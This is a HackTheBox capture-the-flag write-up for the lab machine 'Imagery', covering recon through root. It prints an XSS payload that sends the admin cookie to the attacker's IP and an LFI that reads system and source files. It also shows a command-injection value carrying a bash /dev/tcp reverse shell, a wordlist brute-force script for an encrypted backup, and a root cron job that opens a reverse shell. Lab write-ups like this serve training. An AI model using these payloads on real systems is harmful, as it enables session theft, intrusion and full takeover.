---
title: 'HTB | Imagery'
published: 2025-07-02
draft: false
description: 'HTB Machine `Imagery` writeup.'
tags: ['HackTheBox', 'linux']
---

# Recon

## Port Scan

```
# Nmap 7.94SVN scan initiated Wed Oct  1 08:45:03 2025 as: nmap -sC -sV -p22,8000,8387,20528,36650 -Pn -n -vv -oN nmap/tcp_deep 10.10.11.88
Nmap scan report for 10.10.11.88
Host is up, received user-set (0.097s latency).
Scanned at 2025-10-01 08:45:03 IST for 115s

PORT      STATE  SERVICE  REASON         VERSION
22/tcp    open   ssh      syn-ack ttl 63 OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKyy0U7qSOOyGqKW/mnTdFIj9zkAcvMCMWnEhOoQFWUYio6eiBlaFBjhhHuM8hEM0tbeqFbnkQ+6SFDQw6VjP+E=
|   256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBleYkGyL8P6lEEXf1+1feCllblPfSRHnQ9znOKhcnNM
8000/tcp  open   http-alt syn-ack ttl 63 Werkzeug/3.1.3 Python/3.12.7
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/3.1.3 Python/3.12.7
|     Date: Wed, 01 Oct 2025 02:48:49 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.1.3 Python/3.12.7
|     Date: Wed, 01 Oct 2025 02:48:43 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 146960
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Image Gallery</title>
|     <script src="static/tailwind.js"></script>
|     <link rel="stylesheet" href="static/fonts.css">
|     <script src="static/purify.min.js"></script>
|     <style>
|     body {
|     font-family: 'Inter', sans-serif;
|     margin: 0;
|     padding: 0;
|     box-sizing: border-box;
|     display: flex;
|     flex-direction: column;
|     min-height: 100vh;
|     position: fixed;
|     top: 0;
|     width: 100%;
|     z-index: 50;
|_    #app-con
|_http-title: Image Gallery
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD
|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
8387/tcp  closed unknown  reset ttl 63
20528/tcp closed unknown  reset ttl 63
36650/tcp closed unknown  reset ttl 63
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
<SNIP>

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Oct  1 08:46:58 2025 -- 1 IP address (1 host up) scanned in 115.52 seconds
```

- Ports open :
  - 22 - `SSH`
  - 8000 - `HTTP`
- No `UDP` ports open

## Web App @8000

### Configuration

- Programming language - `Python/3.12.7`
- Server Framework - `Flask` : based on 404 page
- Server - `Werkzeug`

### Routes

#### `feroxbuster`

Running without any extensions and only `GET` method because if a route exist, it returns `405` for `method not allowed`.

```shell
$ feroxbuster -u http://10.10.11.88:8000/ --json -o dirbust/root:8000
```

```
/report_bug
/uploads/
/images
/delete_image
/auth_status
/images
/login
/register
/logout
/static/fonts.css
/upload_image
/static/purify.min.js
/static/tailwind.js
/
```

- These seems API routes as their response is in `json`.

### `session` cookie

On registering and loging in, I receive a cookie named `session` with value being a `jwt token`. Decoding this cookie with `flask-unsign` :

```shell
$ flask-unsign -d -c '.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aNysqw.KAxOukfQqfpqvNUlFWM5nJd9bMA'

{'displayId': 'i3j4k5l6', 'isAdmin': False, 'is_impersonating_testuser': False, 'is_testuser_account': False, 'username': 'conner@imagery.htb'}
```

- The app is making a request to the endpoint `/auth_status?_t=<num>` in regular intervals to get decoded value of the `session` cookie.
- At this point, I create my own cookie with `isAdmin` set to `true`, signed with _`any secret string`_ , to check if I can get admin access.
- Unfortunately, no, as the server is decoding and verifying the received cookie value.
- I am not sure what is the purpose of `_t` query param.

---

# Exploitation

## XSS in Report Bug / Stealing admin cookie

- The `report bug` form in the app has two fields : `bugTitle` and `bugDetails`.
- Testing for simple blind xss payloads in these fields, I find `bugDetails` field is vulnerable, however, at first try it took atleast 5 minutes for me to receive a hit.
- I tried this simple payload to capture `admin` user's cookie as the `httponly` flag is set to `false`.

```html
<img src='x' onerror='window.location.href="http://10.10.16.4/cookie/"+document.cookie'></img>
```

- I get a hit with admin's cookie , with decoded value :

```python
{'displayId': 'a1b2c3d4', 'isAdmin': True, 'is_impersonating_testuser': False, 'is_testuser_account': False, 'username': 'admin@imagery.htb'}
```

- `isAdmin` is set to `True` and `email` is `admin@imagery.htb`
- With this cookie, I can login as `admin` and access the **admin panel**.

## LFI in `/get_system_log`

As admin, I have access to some new routes on the app :

```
/admin/users
/admin/delete_user
/admin/bug_reports
/admin/delete_bug_report
/admin/impersonate_testuser
/admin/return_to_admin
/admin/get_system_log
```

Among these, the `get_system_log` route is used to download `logs` for a user present on the box.

```http
GET /admin/get_system_log?log_identifier=admin@imagery.htb.log HTTP/1.1
Host: 10.10.11.88:8000
Cookie: session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aNysqw.KAxOukfQqfpqvNUlFWM5nJd9bMA
```

- Trying to request file `/etc/passwd` , I receive the local system file.
- Next, I will go for source code. I try `app.py` , found nothing. Next, I tried `../app.py` and get the file.
- From the found `app.py`, I request all linked source code files like :
  - `config.py`
  - `utils.py`
  - `api_*.py` - API endpoint files.
  - `db.json` - `json` database file for the app.

- The `secret_key` used to signed the `jwt` is _randomly generated_.

## Leaked credentials / creds for `testuser`

- The `db.json` file contains two users : `admin@imagery.htb` & `testuser@imagery.htb` with their `md5` hashes.
- I try these hashed in `crackstation` and got a hit for `testuser` user's hash :

```
testuser@imager.htb : 2c65c8d7bfbca32a3ed42596192384f6 : iambatman
```

## Command Injection

- Next, I dig in source code analysis of the files I collected.
- From all the route files, I extract all the routes :

```shell
$ grep ".route('" -irR | cut -d"'" -f2
/images
/edit_image_details
/delete_image
/create_image_collection
/get_image_collections
/move_images_to_collection
/uploads/<path:filename>
/register
/login
/logout
/auth_status
/
/report_bug
/admin/users
/admin/delete_user
/admin/bug_reports
/admin/delete_bug_report
/admin/impersonate_testuser
/admin/return_to_admin
/admin/get_system_log
/upload_image
/upload_image_url
/apply_visual_transform
/convert_image
/delete_image_metadata
```

- Some new routes and additional functionality is available to me as `testuser`.
- I used AI to check for any clear vulnerabilites in the codebase. It found command injection in `api_edit.py` file.
- In the `apply_visual_transform()` function, the crop transformation uses `shell=True` with unsanitized user input, which makes `command injection` in only this function possible.
- No other instance of `subprocess.run(...)` has `shell=True` set.
- I send a request to this endpoint to execute and send me reverse shell back.

```http
POST /apply_visual_transform HTTP/1.1
Host: 10.10.11.88:8000
Cookie: session=.eJxNjTEOgzAMRe_iuWKjRZno2FNELjGJJWJQ7AwIcfeSAanjf_9J74DAui24fwI4oH5-xlca4AGs75BZwM24KLXtOW9UdBU0luiN1KpS-Tdu5nGa1ioGzkq9rsYEM12JWxk5Y6Syd8m-cP4Ay4kxcQ.aNy8iw.v6c1crIt9rza8n879UGY-Qjscos

{"imageId":"0baa260b-58c2-4f61-9150-a4633fed3641","transformType":"crop","params":{"x":0,"y":0,"width":"100; bash -c 'bash -i >& /dev/tcp/10.10.16.4/9001 0>&1' ;#","height":225}}
```

- And, I receive a `shell` as `web` user on the box.

---

# Pivoting / shell as `mark`

- Checking the source code again, I notice the `bot` folder , which I didn't had previously.
- This folder is owned by root, and has only one file `admin.py` which I can read.
- Inside this file, there are cleartext credentials for `admin` user on the app.

```python
# ----- Config -----
CHROME_BINARY = "/usr/bin/google-chrome"
USERNAME = "admin@imagery.htb"
PASSWORD = "strongsandofbeach"
BYPASS_TOKEN = "K7Zg9vB$24NmW!q8xR0p%tL!"
APP_URL = "http://0.0.0.0:8000"
# ------------------
```

- I check the password with the previously found uncracked hash, it matches.
- This `admin.py` is a script being ran every minute as a `cron` by the `web` user.
- These credentials were not the same for `mark` user.
- I continue my recon for escalating privileges. I check for `suid` binaries, cron jobs, running processes, non-standard active ports. found nothing interesting.
- Finally, I start hunting for files :
  - Configuration files (`.conf .config .cnf config*.*`)
  - Database files (`.sql .db .*db .db*`)
  - Scripts (`.py .pyc .pl .go .jar .c .sh`)
  - Backup archives (`bak .backup .old .tar .tar.gz .tgz .zip .rar .7z .gz .bz2 .xz .sql .dump`)
- I found `web_20250806_120723.zip.aes` encrypted file inside `/var/backup/` directory.

## Cracking encrypted backup file

- First, I try the collection to passwords I already had to decrypt this file. Not one of them worked.
- Next, I generate a simple python script to go over each password from a wordlist , to attempt to crack the file.

```python
import pyAesCrypt, os

def try_password(enc_file, password):
    try:
        pyAesCrypt.decryptFile(enc_file, "web_20250806_120723.zip", password)
        print(f"[+] Password found: {password}")
        os.remove("web_20250806_120723.zip")
        return True
    except Exception:
        return False

wordlist = "/usr/share/wordlists/rockyou.txt"
for pwd in open(wordlist, "r", encoding="utf-8", errors="ignore"):
    pwd = pwd.strip()
    print(f"[-] Trying : {pwd}")
    if try_password("web_20250806_120723.zip.aes", pwd):
        break

```

- The script found the password `bestfriends`
- Unzipping and checking the decrypted file, I go to `db.json` and found hashes for the users `mark` and `web`.
- Next, I crack these hashes with `crackstation`.

```shell
[Web App]
admin@imagery.htb : 5d9c1d507a3f76af1e5c97a3ad1eaa31 : strongsandofbeach
testuser@imager.htb : 2c65c8d7bfbca32a3ed42596192384f6 : iambatman
mark@imagery.htb : 01c3d2e5bdaf6134cec0a367cf53e535 : supersmash
web@imagery.htb : 84e3c804cf1fa14306f26f9f3da177e0 : spiderweb1234
```

- I switch user to `mark` with the found password. I now have shell as `mark`.

# Privilege Escalation / shell as `root`

- Since, its an `easy level` box, I first check : `sudo -l` and found that `mark` has access to run the binary `/usr/local/bin/charcol`.
- It seems like a custom cmdline python script `charcol.py` , that encrypts and backups directories and has ability to add `cron jobs`.
- A little through the docs, I find the `auto add` subcommand that adds a `cron job` for the `root` user. I test and confirm by adding a cron to execute `$ touch /tmp/pwn.txt` command , each minute. The file generated has its owner as `root`.
- I delete my last created cron and add another , this time to get me a root shell, to run every 5 minutes.

```shell
charcol> auto add --command "bash -c 'bash -i >& /dev/tcp/10.10.16.4/9003 0>&1'" --name revshell
```

- With this , I get a connection back, and I have `root` shell.
